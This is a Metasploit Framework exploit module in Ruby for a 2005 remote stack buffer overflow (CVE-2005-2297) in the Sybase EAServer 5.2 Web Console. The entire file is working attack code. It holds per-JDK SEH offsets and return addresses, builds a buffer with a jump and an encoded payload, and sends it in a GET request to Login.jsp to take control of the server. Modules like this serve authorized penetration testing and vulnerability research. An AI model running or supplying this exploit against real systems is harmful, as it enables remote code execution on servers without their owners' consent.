##
# $Id: sybase_easerver.rb 9583 2010-06-22 19:11:05Z todb $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Sybase EAServer 5.2 Remote Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the Sybase EAServer Web
				Console. The offset to the SEH frame appears to change depending
				on what version of Java is in use by the remote server, making this
				exploit somewhat unreliable.
			},
			'Author'         => [ 'anonymous' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9583 $',
			'References'     =>
				[
					[ 'CVE', '2005-2297' ],
					[ 'OSVDB', '17996' ],
					[ 'BID', '14287'],
				],
			'Privileged'     => false,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    	=> 1000,
					'BadChars' 	=> "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\\$\%",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Technically we could combine these into a single multi-return string...
					['Windows All - Sybase EAServer 5.2 - jdk 1.3.1_11', {'Ret' => 0x6d4548ff, 'Offset' => 3820}],
					['Windows All - Sybase EAServer 5.2 - jdk 1.3.?.?',  {'Ret' => 0x6d4548ff, 'Offset' => 3841}],
					['Windows All - Sybase EAServer 5.2 - jdk 1.4.2_06', {'Ret' => 0x08041b25, 'Offset' => 3912}],
					['Windows All - Sybase EAServer 5.2 - jdk 1.4.1_02', {'Ret' => 0x08041b25, 'Offset' => 3925}],
				],
			'DisclosureDate' => 'Jul 25 2005'))

		register_options(
			[
				OptString.new('DIR', [ true, "Directory of Login.jsp script", '/WebConsole/' ]),
				Opt::RPORT(8080)
			], self.class)
	end

	def exploit

		print_status( "Attempting to exploit...")

		# Building the evil buffer
		crash = rand_text_alphanumeric(5000, payload_badchars)
		crash[ target['Offset'] - 4, 2 ] = "\xeb\x06"
		crash[ target['Offset']    , 4 ] = [target.ret].pack('V')
		crash[ target['Offset'] + 4, payload.encoded.length ] = payload.encoded

		# Sending the request
		res = send_request_cgi({
			'uri'          => datastore['DIR'] + 'Login.jsp?' + crash,
			'method'       => 'GET',
			'headers'      => {
				'Accept'	=> '*/*',
				'User-Agent'	=> 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
			}
		}, 5)

		print_status("Overflow request sent, sleeping for four seconds")
		select(nil,nil,nil,4)
	end

end